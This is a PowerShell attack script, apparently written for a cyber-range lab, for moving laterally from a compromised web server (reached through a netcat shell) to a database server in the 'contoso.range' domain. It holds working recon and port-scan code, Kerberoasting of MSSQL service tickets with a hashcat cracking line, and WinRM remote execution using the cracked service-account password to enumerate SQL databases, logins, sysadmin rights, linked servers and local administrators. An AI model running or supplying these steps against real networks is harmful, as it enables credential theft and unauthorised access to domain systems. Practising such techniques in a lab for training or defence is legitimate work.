# =============================================================================
# LATERAL MOVEMENT: httpserver -> dbserver via WinRM
# Run these commands FROM the nc shell on httpserver
# =============================================================================

# ─── RECON ────────────────────────────────────────────────────────────────────
hostname; whoami
nltest /dsgetdc:contoso.range
net group "domain admins" /domain
setspn -Q */* | Select-String "MSSQL|SQL"

# Port scan dbserver
@(135,445,1433,3389,5985) | ForEach-Object {
    $c = New-Object Net.Sockets.TcpClient
    $r = $c.BeginConnect("blueDBServer",$_,$null,$null)
    $w = $r.AsyncWaitHandle.WaitOne(3000,$false)
    if($w -and $c.Connected) { Write-Output "Port ${_}: OPEN"; $c.Close() }
    else { Write-Output "Port ${_}: closed" }
}

# ─── KERBEROAST ───────────────────────────────────────────────────────────────
Add-Type -AssemblyName System.IdentityModel
$spns = @(
    "MSSQLSvc/blueDBServer.contoso.range:1433",
    "MSSQLSvc/blueDBServer.contoso.range:SQLEXPRESS",
    "MSSQLSvc/blueDBServer.contoso.range"
)
foreach($spn in $spns) {
    try {
        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        $bytes = $token.GetRequest()
        $hex = [BitConverter]::ToString($bytes) -replace "-"
        Write-Output "SPN: $spn | Ticket length: $($hex.Length)"
        Write-Output $hex
    } catch { Write-Output "SPN $spn failed: $_" }
}
# Crack with: hashcat -m 13100 hash.txt rockyou.txt -r rules/best64.rule

# ─── WINRM LATERAL MOVE ──────────────────────────────────────────────────────
# Replace PASSWORD with cracked svc.mssql password (differs per environment!)
$password = 'CRACKED_PASSWORD_HERE'
$pw = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object PSCredential('contoso\svc.mssql', $pw)

# Test WinRM first
Test-WSMan -ComputerName blueDBServer

# Execute commands on dbserver
Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {
    Write-Output "=== DBSERVER RECON ==="
    Write-Output "Hostname: $(hostname)"
    Write-Output "User: $(whoami)"
    Write-Output "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"

    Write-Output "`n=== SQL Server ==="
    Get-Service *SQL* | Select Name,Status,DisplayName | Format-Table -AutoSize

    Write-Output "`n=== SQL Databases ==="
    try {
        $c = New-Object System.Data.SqlClient.SqlConnection
        $c.ConnectionString = 'Server=localhost;Integrated Security=True;Connection Timeout=10'
        $c.Open()
        $cmd = $c.CreateCommand()
        $cmd.CommandText = 'SELECT SYSTEM_USER'
        Write-Output "SQL User: $($cmd.ExecuteScalar())"

        $cmd2 = $c.CreateCommand()
        $cmd2.CommandText = 'SELECT name FROM sys.databases'
        $rd = $cmd2.ExecuteReader()
        while($rd.Read()) { Write-Output "  DB: $($rd[0])" }
        $rd.Close()

        # Check sysadmin
        $cmd3 = $c.CreateCommand()
        $cmd3.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
        Write-Output "sysadmin: $($cmd3.ExecuteScalar())"

        # List SQL logins
        $cmd4 = $c.CreateCommand()
        $cmd4.CommandText = "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G')"
        $rd4 = $cmd4.ExecuteReader()
        Write-Output "`n=== SQL Logins ==="
        while($rd4.Read()) { Write-Output "  $($rd4[0]) ($($rd4[1]))" }
        $rd4.Close()

        # Check linked servers
        $cmd5 = $c.CreateCommand()
        $cmd5.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'
        $rd5 = $cmd5.ExecuteReader()
        Write-Output "`n=== Linked Servers ==="
        while($rd5.Read()) { Write-Output "  $($rd5[0]) -> $($rd5[1])" }
        $rd5.Close()

        $c.Close()
    } catch { Write-Output "SQL Error: $_" }

    Write-Output "`n=== Network ==="
    ipconfig | Select-String 'IPv4|Gateway'

    Write-Output "`n=== Local Admins ==="
    net localgroup administrators

    Write-Output "`n=== LATERAL MOVEMENT COMPLETE ==="
}

# ─── INTERACTIVE SESSION (evil-winrm equivalent) ─────────────────────────────
# $sess = New-PSSession -ComputerName blueDBServer -Credential $cred
# Enter-PSSession $sess
